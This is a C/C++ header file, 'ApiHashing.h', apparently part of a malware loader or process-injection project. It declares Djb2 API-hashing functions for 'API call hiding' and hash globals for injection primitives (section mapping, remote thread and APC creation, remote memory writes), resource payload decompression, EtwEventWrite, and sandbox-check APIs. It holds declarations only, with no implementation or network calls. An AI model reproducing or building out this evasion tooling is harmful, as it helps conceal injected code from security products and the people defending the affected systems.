#pragma once

#include <Windows.h>

#ifdef __cplusplus
extern "C" {
// constexpr: compile-time evaluation in C++ (CTIME_ macros).
// extern "C": C linkage — .c translation units can call these at runtime.
constexpr DWORD HashStringDjb2A(const char* String);
constexpr DWORD HashStringDjb2W(const wchar_t* String);
#endif

/* =========================================================================
 *  ApiHashing.h - API call hiding (Djb2)
 * ========================================================================= */

HMODULE GetModuleHandleH(DWORD dwModuleHash);
FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiHash);

// Runtime C-linkage wrappers — guaranteed symbol emission for .c files
DWORD Djb2HashA(const char* String);
DWORD Djb2HashW(const wchar_t* String);

void ApiHashing_InitHashes(void);

extern DWORD g_Hash_ntdll;
extern DWORD g_Hash_kernel32;
extern DWORD g_Hash_kernelbase;
extern DWORD g_Hash_ZwCreateSection;
extern DWORD g_Hash_ZwMapViewOfSection;
extern DWORD g_Hash_ZwUnmapViewOfSection;
extern DWORD g_Hash_ZwClose;
extern DWORD g_Hash_ZwOpenSection;
extern DWORD g_Hash_ZwCreateThreadEx;
extern DWORD g_Hash_ZwQueryInformationProcess;
extern DWORD g_Hash_ZwWriteVirtualMemory;
extern DWORD g_Hash_ZwResumeThread;
extern DWORD g_Hash_ZwAllocateVirtualMemory;
extern DWORD g_Hash_ZwFlushInstructionCache;
extern DWORD g_Hash_ZwProtectVirtualMemory;
extern DWORD g_Hash_FindResourceW;
extern DWORD g_Hash_LoadResource;
extern DWORD g_Hash_LockResource;
extern DWORD g_Hash_SizeofResource;
extern DWORD g_Hash_VirtualAlloc;
extern DWORD g_Hash_VirtualFree;
extern DWORD g_Hash_RtlDecompressBuffer;
extern DWORD g_Hash_ExitProcess;
extern DWORD g_Hash_ZwQueueApcThread;
extern DWORD g_Hash_EtwEventWrite;
extern DWORD g_Hash_ExitThread;
extern DWORD g_Hash_CreateSemaphoreA;
extern DWORD g_Hash_CloseHandle;
extern DWORD g_Hash_GetLastError;
extern DWORD g_Hash_GetTickCount64;
extern DWORD g_Hash_GetSystemInfo;
extern DWORD g_Hash_RtlComputeCrc32;
extern DWORD g_Hash_Sleep;
extern DWORD g_Hash_user32;
extern DWORD g_Hash_GetSystemMetrics;
extern DWORD g_Hash_advapi32;
extern DWORD g_Hash_RegOpenKeyExA;
extern DWORD g_Hash_RegQueryInfoKeyA;
extern DWORD g_Hash_RegCloseKey;

#ifdef __cplusplus
}
#endif
